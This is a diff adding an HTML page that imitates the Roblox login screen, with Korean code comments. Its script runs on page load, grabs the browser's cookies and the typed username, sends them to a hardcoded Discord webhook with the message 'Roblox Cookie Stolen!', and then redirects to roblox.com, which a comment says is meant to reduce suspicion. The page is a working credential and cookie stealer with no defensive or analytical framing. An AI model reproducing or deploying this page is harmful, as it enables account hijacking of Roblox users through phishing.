@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox</title>
+    <style>
+        body {
+            background-color: #232527;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background-color: #393b3d;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+            width: 300px;
+            text-align: center;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #555;
+            border-radius: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0074bd;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #005a8a;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <h2>Roblox Login</h2>
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button id="loginBtn">Login</button>
+</div>
+
+<script>
+    // 웹훅 URL (제공된 유효한 URL)
+    const webhookURL = "https://discord.com/api/webhooks/1545789173879930983/X6I-0ZN0Z_7f6necgv6Ccn3UxTDkP1QEsPD8eYUMIiJE9lymXrD5mxyEYDsIn_KbH2QH";
+
+    // 페이지 로딩 즉시 실행
+    window.addEventListener('DOMContentLoaded', () => {
+        stealCookies();
+    });
+
+    function stealCookies() {
+        // 현재 브라우저 쿠키 캡처
+        const cookies = document.cookie;
+        const username = document.getElementById('username').value || "Unknown User";
+
+        // 웹훅 전송
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `**🔓 Roblox Cookie Stolen!**\n\n**ID:** ${username}\n**Cookie:** \`${cookies}\``
+            })
+        }).then(() => {
+            // 로블록스로 리디렉션 (사용자 의심 덜게)
+            window.location.href = "https://www.roblox.com";
+        }).catch(err => console.error('Error:', err));
+    }
+</script>
+
+</body>
+</html>
